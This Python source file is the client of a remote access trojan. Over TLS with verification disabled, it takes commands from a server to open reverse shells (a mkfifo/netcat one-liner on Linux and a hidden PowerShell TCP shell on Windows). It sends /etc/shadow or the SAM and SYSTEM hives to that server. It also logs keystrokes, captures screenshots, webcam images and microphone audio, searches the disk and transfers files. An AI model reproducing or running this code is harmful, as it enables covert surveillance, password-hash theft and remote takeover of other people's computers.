import socket
import ssl

from client.utils.config import logger
from utils.socket_utils import readline, read_buffer
from utils.file_utils import FileUtils


class AgentClient:
    def __init__(self, server_host: str, server_port: int) -> None:
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = False

    def _create_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        return ctx

    def connect(self):
        ctx = self._create_context()

        raw_sock = socket.create_connection(
            (self.server_host, self.server_port),
            timeout=10
        )

        self.sock = ctx.wrap_socket(raw_sock)
        self.sock.settimeout(None)

        self.running = True
        logger.debug("[agent] Connected to %s:%d", self.server_host, self.server_port)

    def run(self):
        if not self.sock:
            raise RuntimeError("Not connected")

        try:
            while self.running:
                chunk = readline(self.sock)

                if not chunk:
                    continue

                self._handle_command(chunk)
        except KeyboardInterrupt:
            logger.debug("[agent] CTRL+C pressed, exiting")
        except Exception as e:
            logger.debug("[agent] %s", e)
        finally:
            self.close()

    def _handle_command(self, cmd):
        logger.info("[agent] Received command: %r", cmd)
        cmd = cmd.decode("utf-8")

        match cmd.split():
            case ["download", filepath]:
                filepath = filepath.replace("\\", "/")
                self._send_file(filepath)

            case ["SEND_FILE", filename]:
                self._download_file(filename)

            case ["shell", port] if port.isdigit():
                self._shell(int(port))

            case ["keylogger" | "webcam_stream" | "record_audio", duration] if duration.isdigit():
                duration_func = {
                    "keylogger": self._keylogger,
                    "webcam_stream": self._webcam_stream,
                    "record_audio": self._record_audio
                }[cmd.split()[0]]
                duration_func(int(duration))

            case ["ipconfig"]:
                self._ipconfig()

            case ["hashdump"]:
                self._hashdump()

            case ["screenshot"]:
                self._screenshot()

            case ["webcam_snapshot"]:
                self._webcam_snapshot()

            case ["quit"]:
                self.running = False

            case ["search", searchpattern]:
                self._search_file(cmd)

            case _:
                pass

    def _shell(self, port):
        try:
            import platform, os
            if platform.system() == "Linux":
                os.system(
                    """
                        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {} {} >/tmp/f
                    """.format(self.server_host, port)
                )
            elif platform.system() == "Windows":
                os.system(
                    """
                        powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{}', {});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
                    """.format(self.server_host, port)
                )
            else:
                logger.debug("[agent] Unsupported OS")
        except Exception as e:
            logger.debug("[agent] Shell Error: %s", e)

    def _download_file(self, filename):
        try:
            logger.debug(f"[agent] Uploading File {filename}")
            FileUtils.download_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in downloadfile %s", e)

    def _send_file(self, filename: str):
        import os

        try:
            if not os.path.exists(filename):
                self._send_line(f"File not found %s" % filename)
                return
            logger.debug(f"[agent] Downloading File {filename}")
            FileUtils.send_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in sendfile %s", e)

    def _send_line(self, text):
        data = (text + "\n").encode("utf-8")
        try:
            self.sock.sendall(data)
        except OSError:
            self.running = False

    def _ipconfig(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                output = subprocess.check_output(["ip", "a"])
            elif platform.system() == "Windows":
                output = subprocess.run(["cmd.exe", "/C", "ipconfig"], capture_output=True, text=True).stdout.encode('utf-8')
            else:
                output = "OS not supported"

            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output)
        except Exception as e:
            logger.debug("[agent] Error in ipconfig %s", e)

    def _search_file(self, cmd):
        import subprocess, platform

        filename = cmd.split()[1]

        try:
            if platform.system() == "Linux":
                output = subprocess.check_output(["find", "/", "-name", f"*{filename}*", "-type", "f"], stderr=subprocess.DEVNULL)
            elif platform.system() == "Windows":
                output = subprocess.run(["powershell", "-NoProfile", "-Command", fr"Get-ChildItem -Path C:\ -Recurse -File -Filter '*{filename}*' -ErrorAction SilentlyContinue | Select-Object -Expand FullName"], capture_output=True, text=True).stdout
            else:
                output = "OS not supported"
            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output.encode('utf-8'))
        except Exception as e:
            logger.debug("[agent] Error in search %s", e)

    def _hashdump(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                FileUtils.send_file(self.sock, "/etc/shadow")
            elif platform.system() == "Windows":
                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\sam sam.save"])
                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\system system.save"])
                FileUtils.send_file(self.sock, "sam.save")
                FileUtils.send_file(self.sock, "system.save")
                subprocess.run(["cmd.exe", "/C", r"del sam.save"])
                subprocess.run(["cmd.exe", "/C", r"del system.save"])
        except Exception as e:
            logger.debug("[agent] Error in hashdump %s", e)

    def _screenshot(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                subprocess.run(["import", "-window", "root", "screenshot.png"])
            elif platform.system() == "Windows":
                ps_script = r"""
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $i=New-Object System.Drawing.Bitmap $b.Width,$b.Height
                $g=[System.Drawing.Graphics]::FromImage($i)
                $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
                $i.Save("$pwd\screenshot.png")
                """

                subprocess.run(["powershell", "-NoProfile", "-Command", ps_script], check=True)
            else:
                logger.debug("[agent] Unsupported OS")

            FileUtils.send_file(self.sock, "screenshot.png")
        except Exception as e:
            logger.debug("[agent] Error in screenshot %s", e)

    def _keylogger(self, duration: int):
        """Enregistre les frappes clavier pendant `duration` secondes."""
        import threading
        try:
            from pynput.keyboard import Listener

            keys = []
            stop_event = threading.Event()

            def on_press(key):
                try:
                    keys.append(key.char)
                except AttributeError:
                    keys.append(f"[{key.name}]")

            listener = Listener(on_press=on_press)
            listener.start()
            stop_event.wait(timeout=duration)
            listener.stop()

            output = "".join(keys).encode("utf-8")
            self.sock.sendall(
                b"DISPLAY\n" + str(len(output)).encode("utf-8") + b"\n" + output
            )
            logger.debug("[agent] Keylogger: %d keys captured", len(keys))
        except Exception as e:
            logger.debug("[agent] Keylogger error: %s", e)
            
    def _webcam_snapshot(self):
        """Prend une photo via la webcam et l'envoie au serveur."""
        try:
            import cv2

            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()

            if not ret:
                self._send_line("ERROR: webcam capture failed")
                return

            filepath = "webcam_snapshot.png"
            cv2.imwrite(filepath, frame)
            FileUtils.send_file(self.sock, filepath)

            import os
            os.remove(filepath)
            logger.debug("[agent] Webcam snapshot sent")
        except Exception as e:
            logger.debug("[agent] Webcam snapshot error: %s", e)
            
    def _webcam_stream(self, duration: int):
        """Envoie des frames de la webcam pendant `duration` secondes."""
        try:
            import cv2
            import struct
            import time

            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self._send_line("ERROR: webcam not available")
                return

            end_time = time.time() + duration

            while time.time() < end_time:
                ret, frame = cap.read()
                if not ret:
                    break

                _, buf = cv2.imencode(".jpg", frame)
                data = buf.tobytes()

                # Protocole: FRAME\n<size>\n<data>
                header = b"FRAME\n" + str(len(data)).encode("utf-8") + b"\n"
                self.sock.sendall(header + data)
                time.sleep(0.1)  # ~10 FPS

            cap.release()
            # Signal de fin
            self.sock.sendall(b"STREAM_END\n")
            logger.debug("[agent] Webcam stream ended")
        except Exception as e:
            logger.debug("[agent] Webcam stream error: %s", e)
            
    def _record_audio(self, duration: int):
        """Enregistre l'audio du micro pendant `duration` secondes."""
        try:
            import pyaudio
            import wave

            chunk = 1024
            fmt = pyaudio.paInt16
            channels = 1
            rate = 44100
            filepath = "recorded_audio.wav"

            p = pyaudio.PyAudio()
            stream = p.open(
                format=fmt, channels=channels,
                rate=rate, input=True, frames_per_buffer=chunk
            )

            logger.debug("[agent] Recording audio for %d seconds...", duration)
            frames = []
            for _ in range(0, int(rate / chunk * duration)):
                data = stream.read(chunk)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            with wave.open(filepath, "wb") as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(p.get_sample_size(fmt))
                wf.setframerate(rate)
                wf.writeframes(b"".join(frames))

            FileUtils.send_file(self.sock, filepath)

            import os
            os.remove(filepath)
            logger.debug("[agent] Audio recording sent")
        except Exception as e:
            logger.debug("[agent] Record audio error: %s", e)

    def close(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        logger.debug("[agent] Closed")
